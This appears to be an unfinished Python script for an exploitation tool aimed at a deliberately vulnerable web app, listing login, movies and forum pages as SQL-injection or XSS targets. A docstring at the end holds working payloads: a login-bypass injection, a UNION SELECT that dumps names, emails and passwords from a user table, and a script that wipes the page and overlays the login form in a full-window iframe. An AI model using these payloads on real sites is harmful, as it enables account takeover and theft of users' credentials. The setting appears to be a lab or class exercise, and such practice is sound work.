import sys 
from vuln_page import VulnPage

#this will be a method and login will be a parameter that's the url 

def getInput(login, vulnerabilities, session=None):
	print("Please select the pages you would like to exploit:\n")
	print("{:<5} {:<10} {:<30} {:<20}".format(Number, "Pages", "URL", "Vulnerabilities"))
	for x in range(len(vulnerabilities)):
		page = vulnerabilities[x]
		print("{:<5} {:<10} {:<30} {:<20}".format(x, page.name, page.url, page.pprint_vuln()))
	print()
	print("List the number")

	

if __name__ == "__main__":
	def_list = [VulnPage("login", "/login", ["SQL"], {"username": "", "password": ""}),
				VulnPage("movies", "/movies", ["SQL"], None),
				VulnPage("forum", "/forum", ["XSS"], {"body":""})]

	getInput(None, def_list)


"""
blah' or '1'='1' --
blah' or '1'='1' union select first_name, last_name, email, id, password from user --

<script> 
document.body.innerHTML = '';
var iFrame = document.createElement('iframe');
var html = '<body>Foo</body>';
iFrame.frameBorder = "0";
iFrame.src = '/login';
iFrame.width  = window.innerWidth;
iFrame.height = window.innerHeight;
document.body.appendChild(iFrame);
console.log('iFrame.contentWindow =', iFrame.contentWindow);
 </script>

"""
